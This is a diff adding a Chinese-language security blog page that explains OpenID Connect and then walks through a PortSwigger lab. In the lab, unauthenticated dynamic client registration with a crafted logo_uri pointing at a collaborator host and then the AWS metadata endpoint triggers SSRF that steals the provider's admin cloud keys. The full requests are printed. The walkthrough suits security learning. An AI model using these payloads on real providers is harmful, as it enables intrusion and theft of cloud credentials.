@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="什么是OpenID Connect？OpenID Connect是一种OAuth协议的扩展，以提供位于基本OAuth实现之上的身份验证。它添加了一些简单的功能，可以更好地支持OAuth的身份验证。 OAuth最初设计的时候是没有哦考虑身份验证的，而是作为在不同应用程序之间的资源授权的一种方法。然而随着许多网站开始定制OAuth作为一种认证机制，出于这个目的，网站会请求对一些基本的用户数据进行访问，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OpenID connect组件介绍">
+<meta property="og:url" content="http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="什么是OpenID Connect？OpenID Connect是一种OAuth协议的扩展，以提供位于基本OAuth实现之上的身份验证。它添加了一些简单的功能，可以更好地支持OAuth的身份验证。 OAuth最初设计的时候是没有哦考虑身份验证的，而是作为在不同应用程序之间的资源授权的一种方法。然而随着许多网站开始定制OAuth作为一种认证机制，出于这个目的，网站会请求对一些基本的用户数据进行访问，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/ZQmp4kOhVKasCAP.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/z1KBwDdREpas82Y.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/UYds2o5KDlGvBuV.png">
+<meta property="article:published_time" content="2023-10-04T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-14T10:58:58.891Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="WebSecurity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/01/14/ZQmp4kOhVKasCAP.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>OpenID connect组件介绍</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/04/PE%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&text=OpenID connect组件介绍"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&is_video=false&description=OpenID connect组件介绍"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OpenID connect组件介绍&body=Check out this article: http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&name=OpenID connect组件介绍&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&t=OpenID connect组件介绍"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFOpenID-Connect%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">什么是OpenID Connect？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OpenID-Connect%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">OpenID Connect的运行方式？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#OpenID-Connect-%E4%B8%AD%E7%9A%84%E8%A7%92%E8%89%B2"><span class="toc-number">2.1.</span> <span class="toc-text">OpenID Connect 中的角色</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#OpenID-Connect-%E4%B8%AD%E7%9A%84claims%E5%92%8Cscope"><span class="toc-number">2.2.</span> <span class="toc-text">OpenID Connect 中的claims和scope</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ID-token"><span class="toc-number">2.3.</span> <span class="toc-text">ID token</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%ABOpenID-Connect"><span class="toc-number">3.</span> <span class="toc-text">识别OpenID Connect</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OpenID-Connect%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">OpenID Connect中的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Unprotected-dynamic-client-registration"><span class="toc-number">4.1.</span> <span class="toc-text">Unprotected dynamic client registration</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.1.1.</span> <span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Allowing-authorization-requests-by-reference"><span class="toc-number">4.2.</span> <span class="toc-text">Allowing authorization requests by reference</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        OpenID connect组件介绍
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-04T15:29:53.000Z" class="dt-published" itemprop="datePublished">2023-10-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/WebSecurity/" rel="tag">WebSecurity</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h4 id="什么是OpenID-Connect？"><a href="#什么是OpenID-Connect？" class="headerlink" title="什么是OpenID Connect？"></a>什么是OpenID Connect？</h4><p>OpenID Connect是一种OAuth协议的扩展，以提供位于基本OAuth实现之上的身份验证。它添加了一些简单的功能，可以更好地支持OAuth的身份验证。</p>
+<p>OAuth最初设计的时候是没有哦考虑身份验证的，而是作为在不同应用程序之间的资源授权的一种方法。然而随着许多网站开始定制OAuth作为一种认证机制，出于这个目的，网站会请求对一些基本的用户数据进行访问，如果这个请求被授权，网站就会假设用户已经在OAuth provider端进行了身份验证。</p>
+<p>客户端应用程序本身是不知道什么时候用什么方法对用户进行身份验证的，必须为不同的OAuth provider设置单独的OAuth机制，这就很麻烦，OpenID Connect通过添加更加标准化的身份验证特性来进行身份验证，解决了这个问题。</p>
+<h4 id="OpenID-Connect的运行方式？"><a href="#OpenID-Connect的运行方式？" class="headerlink" title="OpenID Connect的运行方式？"></a>OpenID Connect的运行方式？</h4><p>OpenID Connect可以直接作用于OAuth flow中，从应用程序的角度看，关键的不同在于有一组额外的标准化作用域，这个作用域对所有的provider都是相同的，此外还有一个额外的响应类型：id_token</p>
+<h5 id="OpenID-Connect-中的角色"><a href="#OpenID-Connect-中的角色" class="headerlink" title="OpenID Connect 中的角色"></a>OpenID Connect 中的角色</h5><p>基本上和OAuth中差不多</p>
+<ul>
+<li>Relying party - 请求用户身份验证的应用程序，也就是客户端应用程序</li>
+<li>End user - 用户</li>
+<li>OpenID provider - 支持OpenID Connect的OAuth service</li>
+</ul>
+<h5 id="OpenID-Connect-中的claims和scope"><a href="#OpenID-Connect-中的claims和scope" class="headerlink" title="OpenID Connect 中的claims和scope"></a>OpenID Connect 中的claims和scope</h5><p>claims指的是资源服务器上用户信息的键值对，比如，“family_name”：“Montoya”。</p>
+<p>基本的OAuth中的scope对于每一个provider都是唯一的，与这个不同，所有的OpenID Connect service使用的是一组相同的scope。为了能够使用OpenID Connect，应用程序必须在认证请求中明确范围（openid），这些范围可以包括一个或多个标准的范围：</p>
+<ul>
+<li>profile</li>
+<li>email</li>
+<li>address</li>
+<li>phone</li>
+</ul>
+<p>每一个上面的scope都对应了用户信息子集的访问，比如open id profile就会授予应用程序读取用户身份相关的信息，如family_name, given_name, birth_date等。</p>
+<h5 id="ID-token"><a href="#ID-token" class="headerlink" title="ID token"></a>ID token</h5><p>OpenID Connect提供的另一个主要功能是 id_token 响应类型，这会返回一个使用JSON web签名（JSON web signature，JWS）的JSON web token（JWT），JWT中包含最初授权请求的一系列用户信息，同时也包含用户上一次被OAuth service验证的时间和方式，客户端应用程序可以使用这一点来决定用户是否已被充分验证。</p>
+<p>使用id_token的主要好处是减少了应用程序和OAuth service之间互相发送请求的次数，提供了更好的性能。和先请求access token再去请求用户数据不同，ID token 会在用户通过身份验证之后直接在响应中包含用户数据并发送至应用程序。</p>
+<p>ID token 中数据传输的完整性是基于JWT加密签名的。</p>
+<p>注意，由于OAuth支持多种响应类型，因此客户端应用程序完全可以使用基本OAuth响应类型和OpenID Connect的id_token响应类型发送授权请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response_type=id_token token</span><br><span class="line">response_type=id_token code</span><br></pre></td></tr></table></figure>
+
+<p>这种情况下，ID token和access token（access code）都会被发送到应用程序。</p>
+<h4 id="识别OpenID-Connect"><a href="#识别OpenID-Connect" class="headerlink" title="识别OpenID Connect"></a>识别OpenID Connect</h4><p>如果客户端应用程序正在使用OpenID connect，那么从授权请求中可以明显看出这一点。最简单的检查方法是查找openid范围。</p>
+<p>即使登录过程最初看起来没有使用OpenID Connect，最好还是检查一下OAuth service是否支持OpenID Connect。可以尝试添加openid scope或将响应类型更改为id_token，然后看是否报错。</p>
+<h4 id="OpenID-Connect中的漏洞"><a href="#OpenID-Connect中的漏洞" class="headerlink" title="OpenID Connect中的漏洞"></a>OpenID Connect中的漏洞</h4><p>OpenID Connect的规范比基本OAuth的规范严格得多，这意味着通常不太可能出现明显漏洞。但是，由于它只是位于OAuth之上的一个层，所以客户端应用程序或OAuth service可能仍然容易受到一些基于basic OAuth的攻击。</p>
+<p>下面将讨论OpenID Connect的一些额外功能可能会引入的一些漏洞。</p>
+<h5 id="Unprotected-dynamic-client-registration"><a href="#Unprotected-dynamic-client-registration" class="headerlink" title="Unprotected dynamic client registration"></a>Unprotected dynamic client registration</h5><p>OpenID规范声明了客户端应用程序向OpenID provider进行注册的标准方法。如果支持动态客户端注册，客户端应用程序可以通过向专用的&#x2F;registration端点发送POST请求来注册自己。</p>
+<p>在请求的数据包中，客户端应用程序以JSON格式提交与自身有关的关键信息，例如，通常需要包含一组白名单重定向URL。同时它也可以提交一系列的附加信息，比如应用程序希望公开的端点名称、应用程序的名称等等，一个典型的注册请求如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /openid/register HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: application/json</span><br><span class="line">Host: oauth-authorization-server.com</span><br><span class="line">Authorization: Bearer ab12cd34ef56gh89</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;application_type&quot;: &quot;web&quot;,</span><br><span class="line">    &quot;redirect_uris&quot;: [</span><br><span class="line">        &quot;https://client-app.com/callback&quot;,</span><br><span class="line">        &quot;https://client-app.com/callback2&quot;</span><br><span class="line">        ],</span><br><span class="line">    &quot;client_name&quot;: &quot;My Application&quot;,</span><br><span class="line">    &quot;logo_uri&quot;: &quot;https://client-app.com/logo.png&quot;,</span><br><span class="line">    &quot;token_endpoint_auth_method&quot;: &quot;client_secret_basic&quot;,</span><br><span class="line">    &quot;jwks_uri&quot;: &quot;https://client-app.com/my_public_keys.jwks&quot;,</span><br><span class="line">    &quot;userinfo_encrypted_response_alg&quot;: &quot;RSA1_5&quot;,</span><br><span class="line">    &quot;userinfo_encrypted_response_enc&quot;: &quot;A128CBC-HS256&quot;,</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>OpenID provider应该要求客户端应用程序对自己进行身份验证。在上面的示例中，使用的是HTTP Bearer token。然而，一些provider将允许在没有任何身份验证的情况下进行动态客户端注册，这使得攻击者能够注册自己的恶意客户端应用程序。</p>
+<p>例如，其中一些属性可以作为URI提供。如果OpenID provider访问了其中任何一个URL，可能会导致SSRF漏洞。</p>
+<h6 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration</span><br></pre></td></tr></table></figure>
+
+<p>环境：允许客户端应用程序通过专用注册端点向OAuth provider动态注册自己，OAuth service以不安全的方式使用某些客户端的数据。</p>
+<p>要求：SSRF攻击以访问<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/%E5%B9%B6%E7%AA%83%E5%8F%96OAuth">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/并窃取OAuth</a> provider的云环境的访问密钥。</p>
+<p>首先查看网站的OAuth配置文件，在<a target="_blank" rel="noopener" href="https://your-oauth-address/.well-known/openid-configuration">https://YOUR-OAUTH-ADDRESS/.well-known/openid-configuration</a></p>
+<p>注意这里是认证服务器的地址，不是网站的地址，要找GET client_id?&#x3D;… 这个包</p>
+<p>找到registration_endpoint接口</p>
+<p>构造注册应用程序数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: oauth-0a7600ce041686cfc010b16e02660082.web-security-academy.net</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;redirect_uris&quot;: [</span><br><span class="line">	&quot;https://example.com&quot;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回数据包中有client_id</p>
+<p><a href="https://smms.app/image/ZQmp4kOhVKasCAP" target="_blank"><img src="https://s2.loli.net/2024/01/14/ZQmp4kOhVKasCAP.png" ></a></p>
+<p>此时注意到在第一次授权的时候，会有一个展示第三方应用程序logo的页面，这个logo是从&#x2F;client&#x2F;CLIENT-ID&#x2F;logo获取的，从OpenID规范可以知道应用程序可以为自己的logo提供URL（使用logo_uri属性），那么现在构造请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: oauth-0a7600ce041686cfc010b16e02660082.web-security-academy.net</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;redirect_uris&quot; : [</span><br><span class="line">        &quot;https://example.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;logo_uri&quot; : &quot;https://BURP-COLLABORATOR-SUBDOMAIN&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到这个请求的响应中的client_id，发送请求logo的数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /client/YFj9nfDXIVqXMMaNzQcCC/logo HTTP/1.1</span><br><span class="line">Host: oauth-0a7600ce041686cfc010b16e02660082.web-security-academy.net</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>此时查看collaborator，收到请求，这意味着可以使用logo_uri引起OAuth server的外部请求</p>
+<p><a href="https://smms.app/image/z1KBwDdREpas82Y" target="_blank"><img src="https://s2.loli.net/2024/01/14/z1KBwDdREpas82Y.png" ></a></p>
+<p>下面只需要将logo_uri改为<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8%E5%90%8C%E6%A0%B7%E7%9A%84%E6%96%B9%E6%B3%95%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E5%8C%85%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%8C%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84%E5%AF%86%E9%92%A5">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/，然后用同样的方法发送数据包就行了，成功拿到管理员的密钥</a></p>
+<p><a href="https://smms.app/image/UYds2o5KDlGvBuV" target="_blank"><img src="https://s2.loli.net/2024/01/14/UYds2o5KDlGvBuV.png" ></a></p>
+<h5 id="Allowing-authorization-requests-by-reference"><a href="#Allowing-authorization-requests-by-reference" class="headerlink" title="Allowing authorization requests by reference"></a>Allowing authorization requests by reference</h5><p>一些OpenID provider提供了将授权参数作为JSON web token（JWT）传递的选项。如果支持此功能，则可以发送一个指向JSON web token的request_uri参数，该token包含其他OAuth参数及其值。根据OAuth service的配置，这个request_uri参数是SSRF的另一个潜在攻击面。</p>
+<p>攻击者可能利用此特性来绕过一些参数值的验证，一些服务器可能会验证授权请求中的键值对，但是可能无法用同样的方法验证JWT中的参数，包括redirect_uri。</p>
+<p>要检查OpenID provider是否支持此特性，应在配置文件中查找request_uri_parameter_supported选项。或者，可以尝试添加request_uri参数，看看是否有效。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFOpenID-Connect%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">什么是OpenID Connect？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OpenID-Connect%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">OpenID Connect的运行方式？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#OpenID-Connect-%E4%B8%AD%E7%9A%84%E8%A7%92%E8%89%B2"><span class="toc-number">2.1.</span> <span class="toc-text">OpenID Connect 中的角色</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#OpenID-Connect-%E4%B8%AD%E7%9A%84claims%E5%92%8Cscope"><span class="toc-number">2.2.</span> <span class="toc-text">OpenID Connect 中的claims和scope</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ID-token"><span class="toc-number">2.3.</span> <span class="toc-text">ID token</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%ABOpenID-Connect"><span class="toc-number">3.</span> <span class="toc-text">识别OpenID Connect</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OpenID-Connect%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">OpenID Connect中的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Unprotected-dynamic-client-registration"><span class="toc-number">4.1.</span> <span class="toc-text">Unprotected dynamic client registration</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.1.1.</span> <span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Allowing-authorization-requests-by-reference"><span class="toc-number">4.2.</span> <span class="toc-text">Allowing authorization requests by reference</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&text=OpenID connect组件介绍"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&is_video=false&description=OpenID connect组件介绍"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OpenID connect组件介绍&body=Check out this article: http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&title=OpenID connect组件介绍"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&name=OpenID connect组件介绍&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/&t=OpenID connect组件介绍"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
